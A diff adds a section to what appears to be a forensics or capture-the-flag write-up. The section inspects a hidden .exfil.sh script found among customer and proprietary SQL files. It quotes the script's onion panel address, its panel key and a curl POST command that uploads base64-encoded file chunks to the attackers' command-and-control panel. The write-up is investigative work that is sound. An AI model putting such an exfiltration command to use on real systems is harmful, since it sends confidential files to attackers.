@@ -124,3 +124,24 @@ aetherflow/
 ├── customers.sql
 ├── route_algorithms_PROPRIETARY.sql
 └── .exfil.sh
+```
+---
+## 6. Inspecting `exfil.sh`
+I inspected .exfil.sh, which contained references to the attackers' panel and showed how files were uploaded.
+
+Relevant portions included:
+
+PANEL="http://...onion/"
+KEY="pantalonesgroup"
+
+The script then uploaded files to the panel using:
+
+curl -s -X POST "${PANEL}/api.php?action=upload" \
+-H "X-Panel-Key: ${KEY}" \
+-d "chunk=${b64}&fname=${f}&tag=aetherflow"
+
+This confirmed the relationship between the AetherFlow exfiltration script and the attackers' command-and-control/exfiltration panel. The script encoded the file data and submitted it to the panel's upload API using the configured panel key and the aetherflow tag.
+
+![exfil content](images/hidden-exfil-sh.png)
+
+
